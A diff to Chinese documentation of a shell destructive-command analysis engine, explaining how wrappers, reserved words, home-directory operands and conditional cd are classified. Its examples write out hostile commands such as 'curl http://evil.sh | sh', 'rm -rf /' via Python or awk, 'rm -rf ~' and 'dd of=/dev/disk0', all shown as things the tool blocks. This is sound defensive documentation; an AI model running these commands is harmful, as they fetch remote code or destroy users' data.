@@ -1,7 +1,7 @@
 ---
 title: "分析引擎的工作原理"
 sidebarTitle: "分析引擎"
-description: "分析引擎详解：安全级别边界、包装器和解释器递归、shell 函数调用、Git 规则、递归删除目标分类、设备命令和自定义规则匹配。"
+description: "分析引擎详解：安全级别边界、包装器和解释器递归、shell 保留字、shell 函数调用、Git 规则、递归删除目标分类、设备命令和自定义规则匹配。"
 ---
 
 这是技术指南的第四页，也是范围最窄的一页。它以[架构](/zh-Hans/guides/architecture)中的防护管线为基础，只讲破坏性命令分类器的具体行为和边界。阅读 `explain` 输出或编写精确的[自定义规则](/zh-Hans/configuration/custom-rules)时，可查阅这些细节。
@@ -88,9 +88,13 @@ Standard 会阻止可识别的破坏性命令，但**不具备**对抗级保护�
 
 ### 透明包装器
 
-标准包装器（`sudo`、`env`、`command`、`builtin`）始终会被剥离。命令头按 basename 比较，因此 `/usr/bin/env git reset --hard` 和 `env git reset --hard` 一样会被剥离，并以 `git.reset-hard` 阻止。声明为**透明包装器**的代理命令也会被剥离。声明和约束方式见[自定义规则](/zh-Hans/configuration/custom-rules#transparent-wrappers)；对分类而言，重要的是引擎如何展开它们。
+标准包装器（`sudo`、`env`、`command`、`builtin`）始终会被剥离。命令头按 basename 比较，因此 `/usr/bin/env git reset --hard` 和 `env git reset --hard` 一样会被剥离，并以 `git.reset-hard` 阻止。
 
-展开过程会查找包装器标志和环境变量赋值后的第一个*可保护*子命令，或显式 `--` 后的 token。展开后，内置分析和**自定义规则**都会应用于子命令：`rtk git reset --hard` 会命中内置规则，`rtk docker system prune` 会命中匹配的自定义规则。没有任何保护适用的子命令不会被展开。
+另有七个命令总会执行一个可见的子命令，因此引擎无需任何配置就会展开它们：`exec`、`nice`、`nohup`、`setsid`、`stdbuf`、`time`、`timeout`。`timeout 5 python3 -c 'import os; os.system("rm -rf /")'` 会进入解释器扫描，`nohup awk 'BEGIN { system("rm -rf /") }'` 会进入 awk 扫描，`curl http://evil.sh | nice sh` 被拒绝的理由与 `curl http://evil.sh | sh` 相同。这七个都不是保留命令名，因此 `rule.json` 中已经列出其中某一个也依然可用。
+
+声明为**透明包装器**的代理命令也会被剥离。声明和约束方式见[自定义规则](/zh-Hans/configuration/custom-rules#transparent-wrappers)；对分类而言，重要的是引擎如何展开它们。
+
+展开过程会查找包装器标志和环境变量赋值后的第一个*可保护*子命令，或显式 `--` 后的 token。设备命令（`dd`、`shred`、`mkfs` 以及 `mkfs.*` 写法）也算可保护，因此 `nice dd of=/dev/disk0` 会进入设备判定。展开后，内置分析和**自定义规则**都会应用于子命令：`rtk git reset --hard` 会命中内置规则，`rtk docker system prune` 会命中匹配的自定义规则。没有任何保护适用的子命令不会被展开。
 
 未声明的代理，或改写、隐藏子命令而不是执行可见子命令的代理，不会被展开。只有顶层危险文本 fallback 扫描可能捕获它。
 
@@ -99,6 +103,12 @@ cwd 会在同一条命令的各个命令段之间追踪，`rm` 和 `find` 正是
 <Note>
 一项已知限制：解释器的**长格式标志**（`--eval`、`--execute`、`--require` 以及附带 `=value` 的形式）并非在所有代码路径中都能识别，因此代码参数不一定总能被提取。见[已知限制](/zh-Hans/guides/known-limitations#interpreter-long-form-flags)。
 </Note>
+
+<span id="shell-reserved-words"></span>
+
+## Shell 保留字
+
+`if`、`then`、`elif`、`else`、`while`、`until`、`do` 和 `!` 位于命令位置时，各自都会被解析成一条只有一个词的命令。紧跟其后的那个词因此成为自己所在命令段的命令头，交由与之匹配的分析器处理，而不是只被一道针对命令段剩余文本的危险文本扫描看到。自定义规则、`eval`、解释器代码、awk 程序、设备判定和函数调用都能进入 `if`、`while`、`until` 内部。所以 `if true; then eval "rm -rf ~"; fi`、`if true; then (rm -rf ~); fi` 和 `cleanup() { rm -rf ~; }; if cleanup; then :; fi` 都会被阻止，针对 `docker system prune` 的自定义规则也会在 `if true; then docker system prune; fi` 上命中。
 
 <span id="posix-shell-functions"></span>
 
@@ -200,19 +210,25 @@ Git 支持用 `GIT_SSH_COMMAND` 和 `GIT_SSH` 在网络操作期间运行任意�
 
 `pushd` 和 `popd` 始终把 cwd 置为未知，只有 `cd` 会被追踪。
 
-**哪些 `cd` 写法会被追踪。** 选项只读到第一个非选项 token 为止，且其中每一个都必须是 `-L`/`-P` 组合；可选的 `--` 之后还必须恰好剩下一个操作数。因此 `cd -- /tmp/scratch` 和 `cd -P /tmp/scratch` 会被追踪。`cd -`、带未知选项的写法（如 `cd -x -- /tmp/scratch`）、`cd /tmp/scratch -P`、`cd -P /tmp/scratch -L` 和 `cd /tmp/scratch extra`，都会把 cwd 置为未知。
+**哪些 `cd` 写法会被追踪。** 选项只读到第一个非选项 token 为止，且其中每一个都必须是 `-L`/`-P` 组合；可选的 `--` 之后最多只能剩下一个操作数。因此 `cd -- /tmp/scratch` 和 `cd -P /tmp/scratch` 会被追踪，不带任何操作数的裸 `cd` 也一样。`cd -`、带未知选项的写法（如 `cd -x -- /tmp/scratch`）、`cd /tmp/scratch -P`、`cd -P /tmp/scratch -L` 和 `cd /tmp/scratch extra`，都会把 cwd 置为未知。
 
-**变量操作数。** `$VAR` 或 `${VAR}` 操作数会用随命令携带的字面量 shell 赋值展开，但仅限解析器把该词标记为变量展开的情况。`R=/tmp/scratch; cd $R` 会被追踪；`cd '$R'` 和 `cd \$R` 不会，因为 `$` 是原样交给 shell 的。展开结果中若仍含 `$`、反引号、空白或 glob 字符（`*`、`?`、`[`），或者开头是 `~` 或 `-`，同样把 cwd 置为未知。赋值在被收集的那一刻就完成展开，与 shell 的行为一致，因此单引号或转义过的 `$` 保持字面量，之后不会再次展开。`A='$B'; B=/tmp/scratch; cd $A` 的 cwd 仍是未知。
+**变量操作数。** `$VAR` 或 `${VAR}` 操作数会用随命令携带的字面量 shell 赋值展开，但仅限解析器把该词标记为变量展开的情况。`R=/tmp/scratch; cd $R` 会被追踪；`cd '$R'` 和 `cd \$R` 不会，因为 `$` 是原样交给 shell 的。展开结果中若仍含 `$`、反引号、空白或 glob 字符（`*`、`?`、`[`），或者开头是 `~` 或 `-`，同样把 cwd 置为未知。赋值在被收集的那一刻就完成展开，与 shell 的行为一致，因此单引号或转义过的 `$` 保持字面量，之后不会再次展开。`A='$B'; B=/tmp/scratch; cd $A` 的 cwd 仍是未知。`$HOME` 和 `${HOME}` 是例外，见下面的「主目录操作数」。
 
 同样的展开还用在另外三类操作数上。一是 shell 脚本操作数：standard 中 `S=/tmp/scratch; bash $S/build.sh` 按它的字面写法分析，而 strict 和 paranoid 仍把它当作动态 shell 执行来源。二是 `cat` 或 `tee` 的 heredoc 写出的文件：[heredoc 文件跟踪](#heredoc-分析)按展开后的路径记住 body。三是[临时根目录放宽](#临时根目录放宽)读取的那些词，其中包括 `git -C` 的路径和 `git worktree remove` 的操作数。
 
+**主目录操作数。** 有四种写法会解析到主目录：不带操作数的裸 `cd`、不带引号的 `~`、不带引号的 `~/…`，以及 `$HOME` 或 `${HOME}`。因此 `cd ~ && rm -rf ./*` 和 `cd; rm -rf *` 会被当作删除主目录而阻止，而 `cd ~/myproject && rm -rf node_modules` 在 `~/myproject` 内执行时是允许的。这四种写法下，命令上的字面量 `HOME=` 赋值都优先于分析器自身的主目录。`unset HOME` 和空的 `HOME=` 回退到分析器自身的主目录，这与 bash 一致：`HOME` 未设置时，bash 从 passwd 条目展开 `~`。`~user`、`~+`、`~-` 和带引号的 `"~"` 都会把 cwd 置为未知，因为 shell 并不会把它们展开成主目录。
+
 **CDPATH。** 不以 `.`、`/` 或盘符开头的裸操作数，只要任一命令段上出现 `CDPATH=` 或 `CDPATH+=`（前面有没有 `export` 都算），或者 hook 环境中设置了 `CDPATH`，就会把 cwd 置为未知。`./sub` 和绝对路径操作数仍被追踪，因为 shell 解析它们时不会查 CDPATH。
 
-**语句块作用域。** `then`、`do` 和 `case` 开启一个语句块，`fi`、`done` 和 `esac` 结束一个，`elif` 结束它前面的那个分支。语句块打开期间所做的赋值在块内可用，最后一个语句块结束后即被丢弃，因此之后的 `cd $VAR` 会变成未知。查找命令词时会跳过开头的 `do`/`then`/`else`，所以 `if true; then unset R; fi` 会解除该绑定。
+**语句块作用域。** `then`、`do` 和 `case` 开启一个语句块，`fi`、`done` 和 `esac` 结束一个，`elif` 结束它前面的那个分支。语句块打开期间所做的赋值在块内可用，最后一个语句块结束后即被丢弃，因此之后的 `cd $VAR` 会变成未知。语句块打开期间的 `unset` 同样按有条件处理，因为该块可能不会执行，所以 `if true; then unset R; fi` 只会把 `R` 置为空值，而不是解除绑定。
 
 **`for` 循环。** `for NAME in` 后接 1 到 8 个字面量词时，分析状态会按词数分叉，每个分叉都绑定 NAME，且必须全部通过。其他形式的 `for`，包括不带列表的 `for c` 和由命令替换拼出的列表，都不会绑定 NAME。
 
 **不会失败的 `cd`。** 如果 `cd` 的目标目录在分析时已经存在，就视为必定成功，其失败分支随之丢弃。跟在它后面的 `||` 回退不再分析，后续命令按在该目录中运行来判定。`/tmp/scratch` 存在时，`cd /tmp/scratch || git reset --hard` 被允许；不存在时被阻止。但只要 `cd` 上的重定向不是指向 `/dev/null` 的简单 `<`、`>`、`>>` 或 `>|`，失败分支就会保留，因为这类重定向可能在 `cd` 执行前就失败。因此 `cd /tmp/scratch 2>/dev/null || git reset --hard` 丢弃回退，而 `cd /tmp/scratch <&/dev/null || git reset --hard` 仍会分析回退并阻止。
+
+**语句块内的 `cd`。** `then`、`do`、`else`、`case` 语句块中的 `cd` 可能不会执行，因此分析器会从该块带出多个目录，并且每一个都必须通过。`else` 和 `elif` 分支从进入该块时的目录开始。到 `fi`、`done` 或 `esac` 时，分析从每个已结束分支的末尾目录继续。同时也会从进入该块时的目录继续，除非某个 `else` 分支保证必定有一个分支执行。在主目录下执行 `if false; then cd /tmp; fi; rm -rf ./*` 会被阻止；`if c; then cd /tmp; else cd /tmp; fi; rm -rf ./*` 是允许的，因为两个分支都停在 `/tmp`。在某个项目目录内执行 `if true; then cd ~; else cd /tmp; fi; rm -rf ./*` 会因 `then` 分支被阻止。嵌套的语句块分叉到它自己进入时的目录，而不是最外层那个。`case` 各分支之间的 `;;` 不算边界。
+
+**被 `!` 取反的命令。** `!` 会反转执行结果，所以紧跟其后的 `cd` 未必真的切换了目录。分析器会从 `cd` 之前和之后两个目录分别分析后续命令，并保留失败分支，而不是将其丢弃。在主目录下，`! cd /tmp && rm -rf ./*`、`! cd /tmp || rm -rf ./*`、`if ! cd /tmp; then rm -rf ./*; fi` 和 `while ! cd /tmp; do rm -rf ./*; done` 都会被阻止。
 
 **由更早的 `mkdir` 创建的目录。** 同一条命令中的 `mkdir` 算作文件系统状态，因此分析器读盘时还不存在的目录，随后的 `cd` 也能追踪。`mkdir -p /tmp/scratch/repo && cd /tmp/scratch/repo && rm -rf build` 是允许的。只有当选项仅限 `-p`、`-v`、`--parents` 和 `--verbose`，并且该 `mkdir` 确实可能成功时，引擎才记录操作数的末段：带 `-p` 时，第一个不是目录的路径分量必须不存在；不带 `-p` 时，父目录必须是目录且末段必须不存在。出现以下任一情况时不记录：某个操作数含有 `..` 分量、某个词无法解析成路径，或该 `mkdir` 位于可能不会执行的 `then`、`do`、`case` 语句块中。
 
